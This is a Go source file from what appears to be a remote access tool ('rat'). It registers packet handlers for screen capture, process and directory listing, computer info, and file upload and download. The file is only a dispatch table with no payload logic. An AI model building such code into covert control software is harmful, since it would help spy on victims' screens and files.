package main

import (
	"rat/common"
)

type PacketMap map[common.PacketHeader]IncomingPacket

var packets PacketMap

type OutgoingPacket interface {
	GetHeader() common.PacketHeader
	Write(c *Client) error
}

type IncomingPacket interface {
	Read(c *Client) error
}

func InitPackets() {
	packets = make(PacketMap)
	packets[common.PingHeader] = Ping{}
	packets[common.ComputerInfoHeader] = ComputerInfoPacket{}
	packets[common.ScreenHeader] = ScreenPacket{}
	packets[common.ProcessHeader] = ProcessPacket{}
	packets[common.MonitorsHeader] = MonitorsPacket{}
	packets[common.DirectoryHeader] = DirectoryPacket{}
	packets[common.PutFileHeader] = UploadPacket{}
	packets[common.GetFileHeader] = DownloadPacket{}
}

func GetIncomingPacket(header common.PacketHeader) IncomingPacket {
	return packets[header]
}
